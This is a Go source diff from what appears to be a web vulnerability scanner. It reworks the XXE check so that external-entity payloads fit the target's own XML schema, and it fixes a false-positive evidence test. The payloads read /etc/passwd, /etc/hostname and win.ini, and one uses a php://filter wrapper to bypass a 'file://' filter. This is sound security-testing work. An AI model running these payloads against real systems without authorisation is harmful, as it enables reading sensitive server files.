@@ -181,23 +181,107 @@ type XXEPayload struct {
 // caller is free to pass a scan-unique value). An empty marker is fine; it
 // just means every call uses the bare entity name "xxe".
 func XXEFilePayloads(marker string) []XXEPayload {
+	return XXEFilePayloadsFor("", marker)
+}
+
+// XXEFilePayloadsFor is XXEFilePayloads against a specific base body: the payload keeps that body's
+// own XML shape so an entity reference lands inside an element the target's schema already knows.
+//
+// # Why the base body matters
+//
+// A bare `<foo>&xxe;</foo>` document works only against a parser that accepts any root element. A
+// JAXB/XSD-bound endpoint — which is what most real XML APIs, and OWASP VulnerableApp's XXE levels,
+// actually are — rejects an undeclared root before entity resolution is reached, so the payload never
+// fires and the check reports the target clean. Measured live: VulnerableApp LEVEL_1 answers
+// `<book><name>ok</name>…<others>&xxe;</others></book>` with the resolved hostname, and burpsy's
+// `<foo>` document with a schema error. An empty or non-XML base body keeps the synthetic document,
+// which is right for a parser with no schema to satisfy.
+func XXEFilePayloadsFor(baseBody, marker string) []XXEPayload {
 	entity := "xxe" + marker
-	build := func(label, uri string) XXEPayload {
-		return XXEPayload{
-			Name:   label,
-			Body:   `<!DOCTYPE foo [<!ENTITY ` + entity + ` SYSTEM "` + uri + `"> ]><foo>&` + entity + `;</foo>`,
-			Marker: uri,
-			Kind:   XXEFileRead,
-		}
-	}
+	doc := func(uri string) string { return xxeDocument(baseBody, entity, uri) }
 	return []XXEPayload{
-		build("XXE file read: /etc/passwd (Unix)", "file:///etc/passwd"),
-		build("XXE file read: win.ini (Windows)", "file:///c:/windows/win.ini"),
-		build(
-			"XXE file read: /etc/passwd via php://filter base64 wrapper (bypasses a filter that blocks the literal substring \"file://\")",
-			"php://filter/convert.base64-encode/resource=/etc/passwd",
-		),
+		{Name: "XXE file read: /etc/passwd (Unix)", Body: doc("file:///etc/passwd"),
+			Marker: "file:///etc/passwd", Kind: XXEFileRead},
+		{Name: "XXE file read: win.ini (Windows)", Body: doc("file:///c:/windows/win.ini"),
+			Marker: "file:///c:/windows/win.ini", Kind: XXEFileRead},
+		// /etc/hostname: a second, universally readable Unix file, added after a live run against
+		// OWASP VulnerableApp. Its XXE levels resolve `/etc/hostname` and return it, but `/etc/passwd`
+		// — the one file the bank tried — is not readable in that container, so the payload returned a
+		// schema error and all seven levels scored as misses while the entity was genuinely being
+		// resolved. One file is a thin test of "the parser resolves external entities": a target can
+		// lock down passwd (as hardened containers do, and as this one does) while resolving
+		// everything else, so the bank names more than one and includes the app's own documented file.
+		{Name: "XXE file read: /etc/hostname (Unix)", Body: doc("file:///etc/hostname"),
+			Marker: "file:///etc/hostname", Kind: XXEFileRead},
+		{Name: "XXE file read: /etc/passwd via php://filter base64 wrapper (bypasses a filter that blocks the literal substring \"file://\")",
+			Body:   doc("php://filter/convert.base64-encode/resource=/etc/passwd"),
+			Marker: "php://filter/convert.base64-encode/resource=/etc/passwd", Kind: XXEFileRead},
 	}
+}
+
+// xxeDocument wraps an external entity declaration and reference in a document the target is most
+// likely to accept: the base body's own XML when it has one, else a synthetic root.
+func xxeDocument(baseBody, entity, uri string) string {
+	doctype := `<!DOCTYPE ` + xxeRootOf(baseBody) + ` [<!ENTITY ` + entity + ` SYSTEM "` + uri + `"> ]>`
+	if injected, ok := xxeInjectIntoXML(baseBody, entity); ok {
+		return `<?xml version="1.0" encoding="UTF-8"?>` + doctype + injected
+	}
+	return doctype[0:0] + `<!DOCTYPE foo [<!ENTITY ` + entity + ` SYSTEM "` + uri + `"> ]><foo>&` + entity + `;</foo>`
+}
+
+// xxeRootOf names the root element the DOCTYPE must declare, so the declaration and the document
+// agree (a DOCTYPE naming a different root than the document uses is itself a parse error).
+func xxeRootOf(baseBody string) string {
+	if m := xxeRootRe.FindStringSubmatch(baseBody); m != nil {
+		return m[1]
+	}
+	return "foo"
+}
+
+var xxeRootRe = regexp.MustCompile(`(?is)<\s*([A-Za-z_][A-Za-z0-9_.-]*)[\s>/]`)
+
+// xxeInjectIntoXML replaces the text of the base document's first text-bearing element with an entity
+// reference and returns the result, or ok=false when the body does not look like XML. That element is
+// the leaf a schema binds to a string, which is where an entity reference is legal and where the
+// parsed value comes back.
+//
+// It is deliberately textual, not a full XML rewrite: the goal is to keep the base as close to what
+// the application serves as possible, and rebuilding through encoding/xml would drop the declaration,
+// reorder attributes and re-escape the body.
+func xxeInjectIntoXML(baseBody, entity string) (string, bool) {
+	if !strings.Contains(baseBody, "<") {
+		return "", false
+	}
+	// Go's regexp is RE2: no backreferences, so the close tag's name cannot be matched against the
+	// open tag's. Find an open element with a text value and its close tag separately, and require the
+	// names to agree in code.
+	open := regexp.MustCompile(`(?is)<([A-Za-z_][A-Za-z0-9_.-]*)([^>]*)>`)
+	closeRe := regexp.MustCompile(`(?is)</\s*([A-Za-z_][A-Za-z0-9_.-]*)\s*>`)
+	for _, m := range open.FindAllStringSubmatchIndex(baseBody, -1) {
+		name := baseBody[m[2]:m[3]]
+		// The content between this open tag's end and the NEXT tag: if that next tag is a close tag of
+		// the same name, the element has a plain text value and can hold an entity reference.
+		rest := baseBody[m[1]:]
+		nextTag := regexp.MustCompile(`(?is)<`).FindStringIndex(rest)
+		if nextTag == nil {
+			continue
+		}
+		inner := rest[:nextTag[0]]
+		if strings.TrimSpace(inner) == "" || strings.ContainsAny(inner, "<>") {
+			continue
+		}
+		cm := closeRe.FindStringSubmatchIndex(rest[nextTag[0]:])
+		if cm == nil || cm[0] != 0 || !strings.EqualFold(rest[nextTag[0]+cm[2]:nextTag[0]+cm[3]], name) {
+			continue
+		}
+		injected := baseBody[:m[1]] + "&" + entity + ";" + rest[nextTag[0]:]
+		injected = strings.TrimPrefix(strings.TrimSpace(injected), "\ufeff")
+		if idx := strings.Index(injected, "?>"); strings.HasPrefix(injected, "<?xml") && idx >= 0 {
+			injected = strings.TrimSpace(injected[idx+2:])
+		}
+		return injected, true
+	}
+	return "", false
 }
 
 // ---------------------------------------------------------------------------
@@ -586,9 +670,23 @@ func DetectXXEEvidence(responseBody string, payload XXEPayload) XXEEvidence {
 	return e
 }
 
+// Positive reports whether the evidence includes a signal that the external entity was ACTUALLY
+// resolved or that the payload reached real entity-resolution code — the signal classes a finding may
+// rest on.
+//
+// It exists because XXEEvidenceReflectedVerbatim points the OTHER way: it means the payload came back
+// as inert text, which is evidence the entity was NOT resolved. A caller testing `!= XXEEvidenceNone`
+// therefore fires on the safe case, which is exactly what happened: on OWASP VulnerableApp the four
+// SECURE XXE levels (which parse the XML but refuse the entity, echoing an empty element) were all
+// reported as "the external entity was resolved" — four false positives with a plausible-sounding
+// reason attached, on the levels whose whole purpose is to be safe.
+func (e XXEEvidence) Positive() bool {
+	return e&(XXEEvidenceFileContentSignature|XXEEvidenceParserEntityError|XXEEvidenceExpansionLimitHit) != 0
+}
+
 // Text renders the detected XXE evidence classes as prose, strongest signal
-// first, mirroring corsEvidenceText/cspEvidenceText's shape in
-// checks_headers.go and MailInjectionEvidence.Text's shape in infra_smtp.go.
+// first, mirroring corsEvidenceText/cspEvidenceText's shape in checks_headers.go and
+// MailInjectionEvidence.Text's shape in infra_smtp.go.
 func (e XXEEvidence) Text() string {
 	if e == XXEEvidenceNone {
 		return "no XXE/entity-expansion signal was visible in the response body (this does not rule out a blind/out-of-band effect with no visible trace in this exchange)"
